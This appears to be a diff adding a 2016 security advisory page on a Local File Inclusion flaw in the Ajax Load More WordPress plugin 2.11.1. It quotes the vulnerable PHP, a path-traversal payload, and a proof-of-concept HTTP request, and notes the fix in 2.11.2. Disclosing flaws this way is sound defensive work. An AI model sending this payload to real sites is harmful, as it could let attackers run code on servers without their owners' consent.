@@ -1,0 +1,115 @@
+<html> 
+<head> 
+<title>Advisory - Burak Kelebek</title> 
+<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=sunburst"></script>
+<link rel="stylesheet" type="text/css" href="../style.css">
+<body> 
+<div id="console"> 
+<center>
+<ul id="menu">
+  <li><a id="c" href="../index.html">Home</a></li>
+  |
+  <li><a id="c" href="../blog.html">Blog</a></li>
+  |
+  <li><a id="c" href="../advisory.html">Advisories</a></li>
+  |
+  <li><a id="c" href="../contact.html">Contact</a></li>
+</ul></center>
+
+<title>Ajax Load More Local File Inclusion vulnerability - Security Advisories and Insights</title>
+
+<p class="meta">Burak Kelebek, July 2016</p>
+<h1 class="title">Ajax Load More Local File Inclusion vulnerability</h1>
+<p></p>
+<h3>-- Abstract</h3>
+<p>It was discovered that the Ajax Load More WordPress plugin is vulnerable to Local File Inclusion. This issue can potentially be exploited to run arbitrary PHP code. In order to do so, the attacker must be able to place an arbitrary PHP file on the target system. The malicious file must have the .php extension.</p>
+<h3>-- OVE ID</h3>
+<p>OVE-20160712-0034</p>
+<h3>-- Tested versions</h3>
+<p>This issue was succesfully tested on the <a href="https://wordpress.org/plugins/ajax-load-more/">Ajax Load More - Infinite Scroll</a> WordPress Plugin version 2.11.1.</p>
+<h3>-- Fix</h3>
+<p>This issue is fixed in version <a href="https://wordpress.org/plugins/ajax-load-more/changelog/">2.11.2</a></p>
+<h3>-- Details</h3>
+<p>Userinput $repeater is sent to $include = ALM_REPEATER_PATH . 'repeaters/'. $template .'.php'; which results in Local File Inclusion. 
+For a succesfull exploit the payload needed to contain 'repeater' value and a numeric value which when splitted by 'alm_get_repeater_type' results in 'repeater' for the $type parameter.</p>
+<p>repeater=repeater2f%2e%2e%2f../../../xmlrpc</p>
+<p>https://www.owasp.org/index.php/PHP_File_Inclusion
+https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion</p>
+<p><code><pre class="prettyprint">$repeater = (isset($_GET['repeater'])) ? $_GET['repeater'] : 'default';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+$type = alm_get_repeater_type($repeater);
+&nbsp;&nbsp;&nbsp;
+function alm_get_repeater_type($repeater){
+&nbsp;&nbsp;&nbsp;$type = preg_split('/(?=\d)/', $repeater, 2); // split $repeater value at number to determine type
+   $type = $type[0]; // default | repeater | template_&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;return $type;
+}
+&nbsp;&nbsp;&nbsp;
+[..]
+&nbsp;&nbsp;&nbsp;
+if($queryType === 'standard'){ 
+&nbsp;&nbsp;&nbsp;
+[..]
+&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;if($theme_repeater != 'null' &amp;&amp; has_action('alm_get_theme_repeater')){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do_action('alm_get_theme_repeater', $theme_repeater, $alm_found_posts, $alm_page, $alm_item, $alm_current); // Theme Repeater
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include( alm_get_current_repeater($repeater, $type) ); //Include repeater template
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+[..]
+&nbsp;&nbsp;&nbsp;
+function alm_get_current_repeater($repeater, $type) {
+   
+&nbsp;&nbsp;&nbsp;$template = $repeater;
+&nbsp;&nbsp;&nbsp;$include = '';
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;// If is Custom Repeaters (Custom Repeaters v1)
+&nbsp;&nbsp;&nbsp;if( $type == 'repeater' &amp;&amp; has_action('alm_repeater_installed' )){ 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$include = ALM_REPEATER_PATH . 'repeaters/'. $template .'.php';      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!file_exists($include)) //confirm file exists        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   alm_get_default_repeater(); 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;}
+   // If is Unlimited Repeaters (Custom Repeaters v2)
+&nbsp;&nbsp;&nbsp;elseif( $type == 'template_' &amp;&amp; has_action('alm_unlimited_installed' )){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global $wpdb;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$blog_id = $wpdb-&gt;blogid;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($blog_id &gt; 1){&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$include = ALM_UNLIMITED_PATH. 'repeaters/'. $blog_id .'/'.$template .'.php';
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$include = ALM_UNLIMITED_PATH. 'repeaters/'.$template .'.php';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!file_exists($include)) //confirm file exists        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   $include = alm_get_default_repeater(); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;// Default repeater
+&nbsp;&nbsp;&nbsp;else{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$include = alm_get_default_repeater();
+&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;return $include;
+&nbsp;&nbsp;&nbsp;
+}</code></pre></p>
+<p>The victim should have the paid add-on Custom Repeater or Unlimited installed.</p>
+<h3>-- Proof of Concept</h3>
+<p><code><pre class="prettyprint lang-html">GET /html/wp-admin/admin-ajax.php?action=alm_query_posts&amp;query_type=standard&amp;nonce=&amp;repeater=repeater2f%2e%2e%2f../../../xmlrpc&amp;theme_repeater=null HTTP/1.1
+Host: 192.168.50.9
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.50.9/html/
+Cookie: 
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache</code></pre></p>
+<p>I originally wrote this article for Securify B.V.<a href="https://securify.nl/en/advisory/SFY20160732/ajax-load-more-local-file-inclusion-vulnerability.html"> Read more.</a></p> 
+			</div>
+</div>
+
+</div></body></head></html>
